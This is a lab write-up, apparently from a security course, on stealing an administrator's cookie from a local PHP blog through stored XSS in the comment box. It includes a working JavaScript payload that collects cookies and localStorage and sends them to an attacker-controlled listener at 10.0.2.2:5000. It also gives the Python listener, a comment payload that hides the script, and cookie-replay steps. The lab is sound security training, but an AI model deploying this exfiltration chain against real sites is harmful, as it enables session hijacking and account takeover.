
# 1. Scenario

Giving a website, all attacks should only be carried from client-side (same as in the real life). The goal is to gain the root access to the website (admin account).

# 2. Attacks with cross-sites scripting

This attack is carried by injecting some script (normally 1 script is enough) and having that script crawled for data in the main website, sending them to another listening server that the adversaries control.

In this scenario, only the comment section of the posts accepts user's input, hence, making it become the only spot for attacking.

Vulnerabilities usually come from not handling the input correctly, or allowing cross-sites scripting (in this case). Normally, if a script, or a node inside a rendered page trying to call or to send something (data) to other domains that are different with the white list or not same domain as the website, these traffics must be blocked immediately.

## 2.1. Website inspection

According to the guide from [XSS warm-up game](http://xss-game.appspot.com/) and [OWASP](https://owasp.org/www-community/attacks/xss), one of the easiest way to test if the website is vulnerable is adding a tag (a node in the HTML rendered page), for example `<p>Some JavaScript code in here, log, hover,...</p>` or more advanced, some scripts with `<script something in here ...></script>` 

The given website is quite simple, written in PHP, only contains the page `index.php` and a page to display comments (and posts also). The URL of the post displayed page:
```Bash
http://localhost:8080/post.php?id=1
```

Take a look on that, the `?id=1` is the argument for the query command that would be executed in the database every time user's load this page. This insight is helpful with the 2nd requirement (SQL injection).

But currently, with the first stage: gain the admin privileges to access the page `http://localhost:8080/admin.php` we need to focus something else.

## 2.2. The exploit

Since the lab-pm said that, a script that simulates the action of the administrator: visit every pages every minute, so that if we can implanted some script in any page, it can steal the admin's cookie, opening the admin page for us.

There are 2 pages with form to input data: admin and post. But the admin page is quite troublesome, it does not give any log regardless input wrong or right, even with some `UNION` trick. But it still returns different code based on status: `302 - FOUND` if the information is wrong and `200` if correctly (since it will redirect user to admin dashboard).

The other option is the post page, since user's input can be malformed to inject some script to listen and steal cookie. Some simple test to display console alert (`alert()` method of JavaScript) was successfully conducted, so that the target is "comment's text box".

Requirement (the most important) is to not leave any visible trace (like a broken image due to use the `<img></img>` tag).  So the most feasible way is using `script` tag, embedded it on a "harmless" comment.

The attack will consist 2 components an injected script, will look and extract any information inside the `document` object (the website itself), then sends these things back to a listening server (a simple one) that the attacker controls.

## 2.3. The code & explained

The "theft" is written with JavaScript (a very ideal language for website scripting):
```JavaScript
(function(){
	function safeBtoa(str) {
		return btoa(unescape(encodeURIComponent(str)));
	}

	try {
		var cookie = document.cookie || "None";
		var localData = "LS: ";
		for (var i = 0; i < localStorage.length; i++) {
			var key = localStorage.key(i);
			var value = localStorage.getItem(key);
			localData += key + "=" + value + "; ";
		}

	var location = window.location.href;
	var rawData = "Cookies: " + cookie + " | Local: " + localData + " | URL: " + location;
	var data = safeBtoa(rawData);
	var scriptTag = document.createElement('script');
	
	// using IP 10.0.2.2 to reach from VM to host machine
	scriptTag.src = "http://10.0.2.2:5000/log?data=" + data;
	document.head.appendChild(scriptTag);

	} catch (err) {
		var errorData = safeBtoa("CRASH: " + err.message);
		var errScript = document.createElement('script');
		errScript.src = "http://10.0.2.2:5000/log?data=" + errorData;
		document.head.appendChild(errScript);
	}
})();
```

The script contains only 1 function, and a smaller helper to ensure that the byte data (the raw one) could be safely converted into ASCII characters (`safeBtoa`) but it could be dismissed at will.

This function performs "scrapping" at 2 locations: document (the body of the HTML document) and the local storage (with the loop to ensure it fetched all possible entries inside the local storage of the admin's browser). 

The rest of function is to prepare the data to send back to listening server, with the location (to indicate the path or the file's name).

One note is to specify the correct IP address. In this case, because the web server run inside a virtual machine, so it can reach the host machine with the IP: `10.0.2.2`, while port `5000` was specified in the server's code.

Next is the server's code (the listener):

```Python
import http.server
import socketserver
import base64
from datetime import datetime

PORT = 5000 

class Listener(http.server.SimpleHTTPRequestHandler):
	def end_headers(self):
		self.send_header('Access-Control-Allow-Origin', '*')
		self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
		self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
		super().end_headers()

	def do_OPTIONS(self):
		self.send_response(200)
		self.end_headers()

  
	def do_GET(self):
		if "/log" in self.path:
			# forged a response with plain text (avoid CORS error)
			self.send_response(200)
			self.send_header("Content-type", "text/plain")
			self.end_headers()

			try:
				query = self.path.split("data=")[1]
				decoded_data = base64.b64decode(query).decode('utf-8')
				print(f"\n[{datetime.now()}] SUCCESS:")
				print(f"{decoded_data}")

				  with open("output_data.txt", "a") as f:
					  f.write(f"{datetime.now()} - {decoded_data}\n")
			except Exception as e:
				print(f"Error decoding data: {e}")

			self.wfile.write(b"OK")
		else:
			super().do_GET()

print(f"[LOG] Server is running on {PORT}...")
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), Listener) as httpd:
	httpd.serve_forever()
```

The server is a simple listener, has 2 main methods: `OPTION` - to set the header, so that would seemed legal as from actual client, and `GET` - to fetch the stolen data from our script.

Run the server inside the guest machine (attacker's machine) and inject the script into the website with this payload:
```text
This is a comment, harmless and oblivious <script src="http://10.0.2.2:5000/payload.js"></script>
```
If successfully injected, every minute, the log of listening server will be filled with a base64 encoded text following with a plain text in utf-8 format. Take the cookie, put into local storage with the help of developer tool and access to admin page in the website, it should work.

